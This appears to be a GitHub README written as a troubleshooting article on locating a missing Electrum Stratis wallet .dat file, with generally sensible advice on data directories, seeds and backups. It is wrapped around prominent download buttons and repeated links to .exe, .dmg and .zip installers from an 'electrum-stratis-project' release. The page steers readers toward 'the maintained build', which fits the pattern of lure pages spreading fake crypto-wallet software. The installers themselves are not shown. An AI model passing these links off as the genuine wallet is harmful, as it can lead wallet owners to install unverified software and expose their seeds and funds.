![Electrum-Stratis](assets/banner-article.png)

# The .dat file that is not in your Electrum Stratis folder

<p align="center">Where the file lives now</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The wallet file is not stored inside the application folder, which is why a search there finds nothing. Electrum Stratis keeps wallet files in the user's application-data directory, and the path differs by operating system. If you still hold the seed, the missing file does not matter: the seed rebuilds the wallet without it. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you searched | Where the file actually lives | What to do |
|---|---|---|
| The install directory | The user profile, not the program folder | Search the app-data path |
| The Downloads folder | Only if you copied a backup there | Check your own backup copies |
| A "portable" folder | Only if you chose portable storage | Look for a `wallets` subfolder |
| The whole disk, no result | The file may never have existed separately | Use the seed |

</div>

The file's name is a default, not a guarantee: a renamed wallet file will not appear in a search for the default name.

## Why it happens

Application data and application code are stored separately by design. The program lives where it was installed; wallets live in a per-user data directory so that updating or reinstalling the application does not touch the keys. That separation is good engineering and it is the reason a reinstall never loses funds - and the reason a folder search beside the executable finds nothing.

The confusion usually starts with advice from an older era, when a wallet file sat next to the binary and a backup meant copying a folder. Modern installs do not work that way, and a guide that says otherwise is describing a different setup.

Modern installs put the file somewhere else, and the build that gets this right is the maintained one, with its current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19). It names the backup model it detects before asking for anything, which is the quickest way to know whether a file is even the thing you need.

The wallet file lives in a per-user data directory, not beside the installer, and that directory differs by platform and by packaging. Searching the disk for the file by name is more reliable than guessing the path, because a build that moved its data folder leaves the old file where it was and writes a new one where the application expects it.

## Fix

1. **Open the wallet and let it tell you the path.** The wallet knows where its own file is; an "open containing folder" action or the file properties in the wallet's menu takes you there.
2. **Search the application-data directory, not the install directory.** Look for the wallet's own folder under the user profile, then for a `wallets` subfolder inside it.
3. **Search by size, not only by name.** Wallet files are small and have a recognisable structure; a search for recently modified small files in that tree usually surfaces a renamed one.
4. **Check your own backups before concluding it is gone.** A copy on an external disk or in an old backup is still a wallet file even if its name changed.
5. **If nothing exists, restore from the seed.** The seed is the complete backup; the file was only ever a copy of what the seed already describes.

If the wallet opens normally, the file is not missing at all - it is simply somewhere you have not looked, and the wallet's own properties page will tell you where.

## If that did not work

If the file has genuinely been deleted and there is no backup and no seed, nothing restores the wallet. That is the one case with no technical answer, and it is worth saying plainly rather than offering a workaround.

If a file was imported from an old installation, the wallet may hold it under a new name in its own directory; importing copies the wallet rather than pointing at the original.

If you are unsure whether a file is a wallet, do not open it with random tools. Import it through the wallet's wallet-file import, which reports an explicit reason when it cannot read a file instead of corrupting it. The [standard, multisig and imported wallets in Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md) decide what an imported file can actually restore: a file of keys is not the same object as a seed.

## Prevention

- Copy the wallet file out of the application-data directory after creating a wallet, and label the copy.
- Keep the seed as the primary backup and the file as a convenience.
- Record the wallet's folder path once, in your own notes.
- Never move a wallet file while the wallet is running.
- Test a restore from the seed, so a missing file is an inconvenience rather than a loss.

## FAQ

### I cannot find a file with .dat in my Electrum Stratis folder. Where is it?

Not in the application folder. Wallet files live in the per-user application-data directory, under the wallet's own folder and usually a `wallets` subfolder. The wallet's properties page shows the exact path for the file it has open.

### I imported the .dat file into the old wallet. What happens now?

The import copies the file into the wallet's own directory and opens it there. The original is untouched, so you now have two copies of the same wallet - which is fine as a backup, provided you know which one is current.

### Can I use the wallet without the file at all?

Yes, if you have the seed. Restoring from the seed creates a new wallet file with the same addresses and a new password; the old file is not needed and can stay wherever it is.

### Is the wallet file enough on its own?

Only with its password. A file is ciphertext plus a verifier, so it can confirm a guess but cannot reveal the password. The seed is the backup that does not depend on either.

<!-- DOWNLOAD-BLOCK -->

Two installations on one machine produce two data directories, and a portable build writes beside its executable instead of into the user profile. That is why a file can exist and still be invisible to the copy you just opened. Check both locations, compare modification dates, and open the newer one deliberately rather than letting the application choose.

## Related articles

- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md)
- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
